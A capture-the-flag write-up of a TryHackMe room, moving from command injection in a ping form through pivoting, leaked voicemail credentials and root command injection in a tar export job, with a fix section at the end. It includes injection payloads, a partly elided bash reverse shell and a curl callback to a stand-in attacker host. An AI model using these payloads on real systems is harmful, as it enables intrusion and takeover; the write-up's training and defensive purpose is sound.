# Infinity Pool

**Platform:** TryHackMe (Hacker Holidays) · **Difficulty:** Medium · **Date:** 2026-08-06
**Tags:** Web, Command Injection, Reverse Shell, Pivoting, Port Forwarding, FreePBX, Privilege Escalation

## The target

"Byte Lotus – Infinity Pool," a surveillance-luxe hotel whose public site
("Every detail, observed") runs on **gunicorn**, i.e. a **Python/Flask** app.
Goal: user and root. The storyline's refrain, *"it was never separate
incidents"*, turned out to be the literal solution hint: the **same class of
bug** recurs from the front door to root.

## Recon

`nmap` found only **22/SSH** and **80/HTTP** (gunicorn). `robots.txt` disclosed
two paths it wanted hidden: `/internal/` and `/status`. `/status` was a "Staff
tools" page: a *connectivity checker* that POSTs a `host` field to
`/internal/netcheck` to "confirm a remote property responds." A server that
"confirms a host responds" almost always shells out to `ping`, so that field
was the first thing I pressed on.

## Foothold: command injection in the connectivity check

Baseline first: `host=127.0.0.1` returned real, reflected `ping` output, so my
input was reaching a shell **and** the output came back to me. Source recovered
later confirmed it exactly:

```python
subprocess.run(f"ping -c 1 {host}", shell=True, ...)   # edge/app.py
```

Unsanitised input in a shell string with `shell=True`. I ended the ping and ran
my own command:

```
host=127.0.0.1; whoami        # → web
```

Then swapped in a bash reverse shell (`127.0.0.1; bash -c 'bash -i >& …'`) and
caught it as **`web`**. The user flag was in the `web` account's home directory.

## Enumerating inward: three services behind the "edge"

The app tree at `/var/www/infinity_pool` split into three, and the permissions
told the story: `edge` (mine, world-readable), `automation` (`root` only), and
`watchtower` (owned by a **`svc-watch`** account I hadn't met). `ss -tlnp`
revealed three **loopback-only** services the outside never saw:

- **`:3000`**: a "Watchtower ops console" running as `svc-watch`, which openly
  states it is *"authenticated by network position"*, i.e. **no authentication**
  for anything on localhost, which I now was.
- **`:8080`**: **FreePBX 16.0.45** telephony.
- **`:9000`**: an **automation worker**, and its systemd unit ran it as **root**.

The console's `/api/config` then leaked the lot: FreePBX UCP credentials
(flagged in its own note as unrotated defaults) and the automation endpoint
address. An internal service handing me credentials because I could reach it.

## The dead end: a FreePBX RCE that wasn't

`searchsploit` offered a **FreePBX 16 authenticated RCE** (`generatedocs`), and I
held a valid UCP session, so it looked like a straight line. It wasn't. The
endpoint kept returning `{"status":true}`, but a **sleep/callback oracle**,
injecting `$(curl http://ATTACKER/…)` and watching my own web server, showed
**nothing ever executed**. The `{"status":true}` was the API's generic
acknowledgement, not proof of code execution; this build was patched. Lesson
banked: **don't trust the app's own "ok"**, prove execution out-of-band.

## The real path: a key left on the answering machine

The UCP credentials weren't for RCE, they were for **voicemail**. One message's
caller ID read *"Automation Key `cc_auto_…` from extension 9000"*: the **bearer
token** for the root worker on `:9000`, delivered as a phone message. FreePBX was
never the exploit target, it was a **message drop**. To drive these loopback
services from a browser I tunnelled `8080/9000/3000` back to my box with
**chisel** (reverse port-forward).

## Root: the same bug, one tier up

The worker exposed `POST /jobs/export` behind that bearer token. The baseline
call returned the *exact shell command it runs as root*:

```json
{"command":"tar czf /var/automation/exports/latest.tgz /var/automation/data 2>&1",
 "output":"tar: Removing leading '/' from member names\n"}
```

My `report` value (`latest`) had been pasted straight into the **filename**, run
as root, with the output reflected back. **Command injection again**, the very
same bug as the ping form, now as root:

```
{"report":"x; id #"}     →  output: uid=0(root) gid=0(root) …
```

`;` ends the `tar`, my command runs as root, and `#` comments out the trailing
`.tgz …` the template glues on. Swap `id` for a read and the root flag drops out
of the same `output` field.

## Finding & fix

**Finding:** one vulnerability, **unsanitised input concatenated into a shell
string** (`shell=True`), appears at *both* the public edge (unauthenticated, as
`web`) and the privileged automation worker (as `root`). Supporting failures
chained it together: an internal console that **authenticates by network
position** and **discloses credentials**, **default UCP credentials**, and a
**root API secret distributed via voicemail**.

**Fix:**
- **Never build shell commands by string interpolation.** Pass an argument array
  with no shell (`subprocess.run(["ping","-c","1",host])`), and validate `host`
  against an IP/hostname allowlist. Same rule for the export worker's `report`.
- **Authenticate internal services** properly; "reachable on localhost" is not an
  identity. A foothold makes network-position trust worthless.
- **Keep secrets out of config responses and message stores;** rotate the default
  UCP credentials.
- **Run the automation worker as an unprivileged account,** so that even if it is
  abused, the blast radius is not root.

The room's thesis holds up: defended in one place, the *identical* bug was left
wide open in another. Fixing the class, not the instance, is the whole lesson.
